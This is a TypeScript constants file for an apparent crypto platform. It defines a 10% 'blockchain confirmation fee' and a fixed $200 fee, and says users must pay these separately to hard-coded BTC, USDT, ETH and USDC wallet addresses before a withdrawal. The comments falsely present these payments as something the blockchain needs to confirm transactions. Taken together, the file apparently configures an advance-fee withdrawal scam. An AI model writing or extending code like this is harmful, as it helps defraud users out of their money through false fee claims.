// Transaction and fee constants

/**
 * Minimum withdrawal amount in USD
 */
export const MINIMUM_WITHDRAWAL_AMOUNT = 10;

/**
 * Blockchain confirmation fee percentage for withdrawals
 * This fee is paid separately by the user (not deducted from withdrawal)
 * Example: For a $100 withdrawal, user pays $10 fee separately and receives full $100
 */
export const WITHDRAWAL_FEE_PERCENTAGE = 0.10;

/**
 * BTC wallet address for receiving blockchain confirmation fees
 * Users must pay the 10% fee to this address in a single transaction
 */
export const CONFIRMATION_FEE_WALLET_BTC = "bc1q3jjvkvy9wt54tn05qzk7spryramhkz7qltn2ny";

/**
 * USDT (TRC20) wallet address for receiving blockchain confirmation fees
 * Users must pay the 10% fee to this address in a single transaction
 */
export const CONFIRMATION_FEE_WALLET_USDT = "TXjVqPUj8dKPxqPxAm8jZGfvbqZ5hK3yqN";

/**
 * ETH wallet address for receiving blockchain confirmation fees
 * Users must pay the 10% fee to this address in a single transaction
 */
export const CONFIRMATION_FEE_WALLET_ETH = "0xe6FD2896583721d1e7e14c8fBB6319E92bD65196";

/**
 * USDC (ERC20) wallet address for receiving blockchain confirmation fees
 * Users must pay the 10% fee to this address in a single transaction
 */
export const CONFIRMATION_FEE_WALLET_USDC = "0x739B307F28100563d5f14Fba93dDf6F96Cd4d642";

/**
 * Fixed blockchain confirmation fee amount in USD
 * This is a required fee for all transactions to be confirmed on the blockchain
 */
export const BLOCK_CONFIRMATION_FEE = 200;
